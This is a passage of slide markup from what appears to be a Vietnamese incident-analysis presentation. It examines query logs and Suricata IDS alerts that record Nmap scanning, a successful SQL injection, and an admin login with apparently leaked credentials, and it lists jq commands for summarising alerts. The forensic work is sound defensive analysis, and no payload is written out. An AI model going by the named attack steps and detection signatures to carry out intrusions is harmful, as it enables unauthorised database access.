              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Truy cập trái phép database</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Thực hiện SQL Injection thành công</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600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Cố gắng thu thập thông tin tài khoản người dùng</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="571" name="Google Shape;571;p52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800"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6.3.2. Chi tiết - Phân tích query.log: </a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="572" name="Google Shape;572;p52"/>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573" name="Google Shape;573;p52" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="99349"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="328700" y="4164975"/>
            <a:ext cx="192699" cy="2567850"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="574" name="Google Shape;574;p52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="10121400" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Giai đoạn truy vấn dữ liệu nhạy cảm và truy cập tài khoàn admin:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="575" name="Google Shape;575;p52" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="576" name="Google Shape;576;p52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="785025" y="1975275"/>
            <a:ext cx="3341700" cy="5088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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>- Truy vấn bất thường:</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>	Xuất hiện lúc: 05:26:06</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="577" name="Google Shape;577;p52"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="21887"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="2657775"/>
            <a:ext cx="4450924" cy="1333500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="578" name="Google Shape;578;p52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5974600" y="2148975"/>
            <a:ext cx="3341700" cy="5088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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>- Truy vấn:</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>	Xuất hiện lúc: 05:26:37</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="579" name="Google Shape;579;p52"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="16694"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5974600" y="2657775"/>
            <a:ext cx="5636526" cy="1507200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="580" name="Google Shape;580;p52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6030575" y="4377725"/>
            <a:ext cx="5083500" cy="1930200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t> Phân tích:</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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Có hoạt động đăng nhập tài khoản admin</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Sau đăng nhập đã truy cập /admin.php</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="l"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 Nhận định:</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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>Có khả năng thông tin xác thực đã bị lộ và được sử dụng để đăng nhập</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600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>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584"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="585" name="Google Shape;585;p53"/>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6.3.3. Chi tiết</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> - Phân tích</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> eve.log (IDS): </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="586" name="Google Shape;586;p53"/>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587" name="Google Shape;587;p53" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="99349"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="323764" y="3994600"/>
            <a:ext cx="83088" cy="1988700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="588" name="Google Shape;588;p53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="406850" y="4088350"/>
            <a:ext cx="4886700" cy="2670300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-301625" algn="just"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Phân tích: </a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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ET SCAN Possible Nmap User-Agent Observed: Suricata phát hiện User – Agent đặc trưng của Nmap =&gt; nhận định kẻ tấn công đã dử dụng nmap để dò dịch vụ web.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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ET INFO Possible Kali Linux hostname in DHCP Request Packet: Suricata IDS phát hiện gói DHCP có hostname là kali =&gt; Nhận định máy gửi traffic rất có thể là Kali linux – Đây là dấu hiệu nhận dạng hệ điều hành nguồn.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ SQLi Attempt: Suricata phát hiện payload SQL Inject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>ion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1200" i="1">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="589" name="Google Shape;589;p53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="6096000" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Phân tích cảnh báo (alerts.json):</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="590" name="Google Shape;590;p53" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="591" name="Google Shape;591;p53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="261950" y="1818450"/>
            <a:ext cx="5577000" cy="941700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="just"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Thống kê signature tấn công:</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jq -r '.alert.signature' alerts.json | sort | uniq -c | sort -nr</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="592" name="Google Shape;592;p53"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect t="14398" b="38303"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="261949" y="2556450"/>
            <a:ext cx="5172376" cy="1315550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="593" name="Google Shape;593;p53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6228650" y="1818450"/>
            <a:ext cx="5577000" cy="941700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="just"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Trích xuất thời gian và loại tấn công:</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="457200" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60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cat alerts.json | jq '{time:.timestamp,attack:.alert.signature}'</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
